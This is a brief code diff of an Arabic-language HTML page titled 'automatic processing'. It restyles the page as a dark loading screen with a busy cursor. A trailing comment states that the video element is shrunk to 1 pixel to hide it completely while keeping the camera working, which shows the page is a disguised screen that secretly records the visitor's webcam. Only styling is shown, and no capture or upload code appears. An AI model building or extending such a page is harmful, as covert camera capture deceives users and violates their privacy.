@@ -5,17 +5,23 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>معالجة تلقائية</title>
     <style>
-        body {
-            background-color: #ffffff; /* جعل الخلفية بيضاء تماماً */
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            overflow: hidden;
-            font-family: Arial, sans-serif;
-        }
+       body {
+    /* خلفية متدرجة فخمة جداً (Dark Luxury Gradient) */
+    background: radial-gradient(circle at center, #1e293b 0%, #0f172a 100%);
+    
+    margin: 0;
+    padding: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    overflow: hidden;
+    font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    
+    /* إضافة لمسة احترافية */
+    color: #ffffff;
+    cursor: wait; /* مؤشر الماوس يظهر أن هناك عملية جارية */
+}
         /* تعديل الأبعاد لإخفاء الفيديو تماماً مع الحفاظ على عمل الكاميرا */
         video {
             width: 1px; /* تصغير العرض لـ 1 بكسل */
